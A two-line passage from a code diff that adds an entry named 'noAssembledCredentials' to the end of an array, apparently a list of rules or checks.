+  noAssembledCredentials,
+];
